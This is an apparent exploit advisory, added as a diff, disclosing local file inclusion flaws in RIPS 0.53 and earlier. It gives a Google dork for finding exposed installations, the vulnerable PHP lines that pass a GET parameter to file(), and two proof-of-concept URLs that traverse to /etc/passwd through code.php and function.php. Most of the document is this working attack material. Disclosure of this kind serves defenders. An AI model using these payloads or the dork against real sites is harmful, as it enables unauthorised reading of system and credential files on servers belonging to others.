@@ -1,0 +1,30 @@
+# RIPS <= 0.53 Multiple Local File Inclusion Vulnerabilities
+# Google Dork: allintitle: "RIPS - A static source code analyser for
+vulnerabilities in PHP scripts"
+# Althout this script is not intended to be accesible from internet, there
+are some websites that host it.
+# Download: http://sourceforge.net/projects/rips-scanner/
+# Date: 23/03/12
+# Contact: mattdch0@gmail.com
+# Follow: @mattdch
+# www.localh0t.com.ar
+
+
+File: /windows/code.php
+=======================
+
+102: file $lines = file($file);
+    96: $file = $_GET['file'];
+
+PoC:
+http://localhost/rips/windows/code.php?file=../../../../../../etc/passwd
+
+File: /windows/function.php
+===========================
+
+    64: file $lines = file($file);
+        58: $file = $_GET['file'];
+
+PoC:
+http://localhost/rips/windows/function.php?file=../../../../../../etc/passwd(will
+read the first line of the file)
